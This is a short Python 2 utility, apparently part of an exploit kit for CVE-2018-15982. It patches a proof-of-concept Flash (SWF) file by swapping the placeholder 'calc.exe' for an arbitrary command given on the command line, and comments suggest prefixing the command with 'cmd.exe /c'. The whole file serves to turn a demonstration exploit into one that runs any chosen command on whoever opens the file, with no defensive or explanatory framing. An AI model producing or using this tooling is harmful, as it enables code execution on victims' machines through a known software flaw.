#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import sys
import getopt

# C:\WINDOWS\system32\cmd.exe /c
# py2 tools/replaceBin.py -i /mysvn/CVE-2018-15982_PoC.swf -o /mysvn/test.swf -c 'notepad.exe'
inputfile = ''
outputfile = ''
cmd = ''
argv=sys.argv[1:]
try:
    opts, args = getopt.getopt(argv,"hi:o:c:",["ifile=","ofile=","cmd="])
except getopt.GetoptError:
    print 'py2 tools/replaceBin.py -i <inputfile> -o <outputfile> -c <cmd>'
    sys.exit(2)
# print(opts)
for opt, arg in opts:
    if opt == '-h':
        print 'test.py -i <inputfile> -o <outputfile>'
        sys.exit()
    elif opt in ("-i", "--ifile"):
        inputfile = arg
    elif opt in ("-o", "--ofile"):
        outputfile = arg
    elif opt in ("-c", "--cmd"):
        cmd = arg

f=open(inputfile,"rb")
# print("["+cmd+"]")
xPay=bytes(cmd)
s=f.read()
f.close()
x1=b'calc.exe'
x1=x1 + b'\x20' * (len(xPay) - len(x1))
s=s.replace(x1,bytes(xPay))
# xx=b'\x63\x61\x6C\x63\x2E\x65\x78\x65'
# print(s.find(x1))
# print(s.find(b'calc.exe'))

f1=open(outputfile,"wb")
f1.write(bytes(s))
f1.close()
